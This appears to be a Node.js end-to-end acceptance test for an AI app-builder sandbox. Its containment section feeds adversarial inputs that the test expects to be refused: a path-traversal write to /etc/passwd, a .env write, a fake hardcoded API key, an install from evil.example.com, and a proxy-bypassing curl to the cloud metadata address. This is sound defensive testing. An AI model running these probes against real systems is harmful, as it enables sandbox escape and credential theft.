#!/usr/bin/env node
/**
 * Live acceptance test against a real Mosaic sandbox.
 *
 * Exercises the actual control-plane tool implementations from api/_lib/tools.js rather
 * than reimplementing them, so a bug in the shipped code fails this script. It walks the
 * path a real turn takes: hydrate a project, install, start the dev server, expose a
 * preview, drive Chromium against it, fill a form, build, and confirm containment holds.
 *
 *   MOSAIC_API_KEY=... node scripts/e2e-sandbox.mjs
 *   node scripts/e2e-sandbox.mjs --keep      # leave the sandbox up for inspection
 *
 * Covers acceptance scenarios 1, 3, and 7 from PLAN.md.
 */

import { resolveMosaicAuth } from './lib/mosaic-auth.mjs';

// The control plane reads credentials from the environment, so seed it before importing.
const auth = resolveMosaicAuth();
process.env.MOSAIC_API_KEY = auth.token;
process.env.MOSAIC_API_URL = auth.endpoint;
process.env.MOSAIC_ENVIRONMENT ||= 'divij-builder-runtime';

const mosaic = await import('../api/_lib/mosaic.js');
const { TOOLS, createContext } = await import('../api/_lib/tools.js');
const { initializeGuest } = await import('../api/_lib/workspace.js');
const { createNextScaffoldForTest } = await import('./lib/scaffold-bridge.mjs');

const keep = process.argv.includes('--keep');
const results = [];
let sandboxId = null;

function heading(text) {
  process.stdout.write(`\n\u25B6 ${text}\n`);
}

function record(name, ok, detail = '') {
  results.push({ name, ok, detail });
  process.stdout.write(`  ${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  ${detail}` : ''}\n`);
}

/** Drive one tool exactly as the HTTP route does, collecting its NDJSON events. */
async function runTool(tool, args, { quiet = false } = {}) {
  const ctx = createContext(sandboxId, new AbortController().signal);
  let result;
  let error;
  for await (const event of TOOLS[tool](ctx, args)) {
    if (event.kind === 'result') result = event.data;
    if (event.kind === 'error') error = event.error;
    if (!quiet && (event.kind === 'stdout' || event.kind === 'stderr')) {
      process.stdout.write(`    ${String(event.text).trimEnd().split('\n').slice(-1)[0]}\n`);
    }
    if (!quiet && event.kind === 'progress' && event.text) process.stdout.write(`    ${event.text}\n`);
  }
  if (error) throw new Error(`${tool}: ${error}`);
  return result;
}

const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');

try {
  // -------------------------------------------------------------------------
  heading('Create and initialize a sandbox');
  const started = Date.now();
  const sandbox = await mosaic.createSandbox({ labels: { builder_e2e: '1' }, ttlSeconds: 1800 });
  sandboxId = sandbox.id;
  process.stdout.write(`  sandbox ${sandboxId} in ${Date.now() - started}ms\n`);

  const runtime = await initializeGuest(sandboxId);
  record(
    'guest initialized with containment enforced',
    runtime.containment === 'enforced' && runtime.egressProxy && runtime.browserHelper,
    JSON.stringify(runtime),
  );

  // -------------------------------------------------------------------------
  heading('Hydrate the project from a local tree');
  const scaffold = createNextScaffoldForTest('e2e-app');
  const files = Object.entries(scaffold).map(([path, content]) => ({ path, content_base64: b64(content) }));
  const sync = await runTool('fs.sync', { files }, { quiet: true });
  record('uploaded the project tree', sync.uploaded === files.length, `${sync.uploaded} files, ${sync.bytes} bytes`);

  const tree = await runTool('fs.tree', {}, { quiet: true });
  record('file tree matches what was uploaded', tree.count >= files.length, `${tree.count} files`);

  const read = await runTool('fs.read', { paths: ['package.json'] }, { quiet: true });
  record('read back a file intact', read.files['package.json'].includes('e2e-app'));

  // -------------------------------------------------------------------------
  heading('Install dependencies through the egress proxy');
  const install = await runTool('pkg.install', {}, { quiet: true });
  record('npm install succeeded through the allowlisted proxy', install.exit_code === 0, install.hint ?? '');

  // -------------------------------------------------------------------------
  heading('Start the dev server');
  const dev = await runTool('dev.start', { command: 'npx next dev -H 0.0.0.0 -p 3000' }, { quiet: true });
  record('dev server answers on loopback', dev.ready === true, `http ${dev.http_status}`);

  // -------------------------------------------------------------------------
  heading('Expose a public preview');
  const preview = await mosaic.createPreview(sandboxId, 3000, 900);
  let previewReady = false;
  for (let i = 0; i < 30; i += 1) {
    const r = await mosaic.previewReady(sandboxId, preview.id).catch(() => ({ ready: false }));
    if (r.ready) {
      previewReady = true;
      break;
    }
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
  const publicResponse = previewReady ? await fetch(preview.url).catch(() => null) : null;
  const publicHtml = publicResponse ? await publicResponse.text() : '';
  record(
    'preview serves the app publicly',
    publicResponse?.status === 200 && publicHtml.includes('e2e-app'),
    `status ${publicResponse?.status}`,
  );

  // -------------------------------------------------------------------------
  heading('Verify in a real browser inside the sandbox');
  const nav = await runTool('browser', { action: 'navigate', url: 'http://127.0.0.1:3000/' }, { quiet: true });
  record('browser loaded the app', nav.ok !== false && nav.status === 200, `status ${nav.status}`);

  const snapshot = await runTool('browser', { action: 'snapshot' }, { quiet: true });
  record('accessibility snapshot names the form controls', /textbox|input|button/i.test(snapshot.snapshot ?? ''));

  const refMatch = /\[(e\d+)\][^\n]*type=text/.exec(snapshot.snapshot ?? '');
  if (refMatch) {
    await runTool('browser', { action: 'fill', ref: refMatch[1], value: 'hello from the agent' }, { quiet: true });
    const buttonMatch = /\[(e\d+)\] button/.exec(snapshot.snapshot ?? '');
    if (buttonMatch) await runTool('browser', { action: 'click', ref: buttonMatch[1] }, { quiet: true });
    const after = await runTool('browser', { action: 'snapshot' }, { quiet: true });
    record('form submission changed the page', (after.snapshot ?? '').includes('hello from the agent'));
  } else {
    record('form submission changed the page', false, 'no text input found in the snapshot');
  }

  const consoleLogs = await runTool('browser', { action: 'console_logs' }, { quiet: true });
  const errorCount = (consoleLogs.console ?? []).filter((c) => c.type === 'error').length;
  record('no console errors on the rendered page', errorCount === 0, `${errorCount} errors`);

  // -------------------------------------------------------------------------
  heading('Typecheck and production build');
  const build = await runTool('verify.build', { typecheck: 'npx tsc --noEmit', build: 'npx next build' }, { quiet: true });
  record(
    'typecheck and build pass',
    build.ok === true,
    build.ok ? '' : (build.steps ?? []).map((s) => `${s.step}=${s.exit_code}`).join(' '),
  );

  // -------------------------------------------------------------------------
  heading('Mirror sandbox-side changes back');
  await runTool('shell.run', { command: 'mkdir -p generated && echo "made by a shell command" > generated/note.txt' }, { quiet: true });
  const changes = await runTool('fs.changes', { include_content: true }, { quiet: true });
  const found = (changes.changed ?? []).find((c) => c.path === 'generated/note.txt');
  record('detects files created by a shell command', Boolean(found));
  record(
    'excludes node_modules from the mirror',
    !(changes.changed ?? []).some((c) => c.path.startsWith('node_modules/')),
    `${(changes.changed ?? []).length} changed paths`,
  );

  // -------------------------------------------------------------------------
  heading('Containment holds under adversarial input');
  const traversal = await runTool('fs.write', { files: [{ path: '../../etc/passwd', content: 'x' }] }, { quiet: true }).catch(
    (err) => ({ rejected: err.message }),
  );
  record('rejects a path traversal write', Boolean(traversal.rejected), traversal.rejected ?? 'ACCEPTED');

  const secret = await runTool('fs.write', { files: [{ path: '.env', content: 'KEY=1' }] }, { quiet: true }).catch(
    (err) => ({ rejected: err.message }),
  );
  record('refuses to write a credential file', Boolean(secret.rejected));

  // A batch write must refuse only the offending file and still land the rest, so the
  // model can see exactly what was rejected instead of losing the whole call.
  const hardcoded = await runTool(
    'fs.write',
    {
      files: [
        { path: 'lib/leak.ts', content: 'export const k = "sk-proj-abcdefghijklmnopqrstuvwxyz012345";' },
        { path: 'lib/fine.ts', content: 'export const k = process.env.SOME_KEY;' },
      ],
    },
    { quiet: true },
  );
  record(
    'refuses a hardcoded API key but still writes its clean sibling',
    (hardcoded.refused ?? []).some((r) => r.path === 'lib/leak.ts') &&
      (hardcoded.paths ?? []).includes('lib/fine.ts'),
    JSON.stringify({ written: hardcoded.paths, refused: (hardcoded.refused ?? []).map((r) => r.path) }),
  );

  const badPackage = await runTool('pkg.install', { packages: ['https://evil.example.com/pkg.tgz'] }, { quiet: true }).catch(
    (err) => ({ rejected: err.message }),
  );
  record('refuses a package spec that is a URL', Boolean(badPackage.rejected));

  const external = await runTool('browser', { action: 'navigate', url: 'https://example.com' }, { quiet: true }).catch(
    (err) => ({ rejected: err.message }),
  );
  record('test browser cannot leave the sandbox', Boolean(external.rejected));

  const metadata = await runTool(
    'shell.run',
    { command: 'curl -sS -m 5 --noproxy "*" http://169.254.169.254/ 2>&1 || echo BLOCKED' },
    { quiet: true },
  );
  record('cloud metadata unreachable from project code', /BLOCKED|Could not resolve|Failed to connect/.test(metadata.stdout + metadata.stderr));

  const unapproved = await runTool(
    'shell.run',
    { command: 'curl -sS -m 15 https://example.com/ 2>&1 | head -2' },
    { quiet: true },
  );
  record('unapproved host refused by the proxy', /403/.test(unapproved.stdout + unapproved.stderr));

  // -------------------------------------------------------------------------
  heading('Revoke the preview');
  await mosaic.revokePreview(sandboxId, preview.id);
  await new Promise((resolve) => setTimeout(resolve, 2000));
  const afterRevoke = await fetch(preview.url).catch(() => null);
  const revokedBody = afterRevoke ? await afterRevoke.text() : '';
  record('revoked preview stops serving', !revokedBody.includes('e2e-app'), `status ${afterRevoke?.status ?? 'unreachable'}`);
} catch (err) {
  record('unexpected failure', false, err.message);
  process.exitCode = 1;
} finally {
  if (sandboxId && !keep) {
    await mosaic.destroySandbox(sandboxId).catch(() => {});
    process.stdout.write(`\nDestroyed ${sandboxId}\n`);
  } else if (sandboxId) {
    process.stdout.write(`\nKept ${sandboxId}\n`);
  }

  const failed = results.filter((r) => !r.ok);
  process.stdout.write('\n=== SUMMARY ===\n');
  for (const r of results) {
    process.stdout.write(`${r.ok ? 'PASS' : 'FAIL'}  ${r.name}${r.detail ? `  (${r.detail})` : ''}\n`);
  }
  process.stdout.write(`\n${results.length - failed.length}/${results.length} passed\n`);
  if (failed.length) process.exitCode = 1;
}
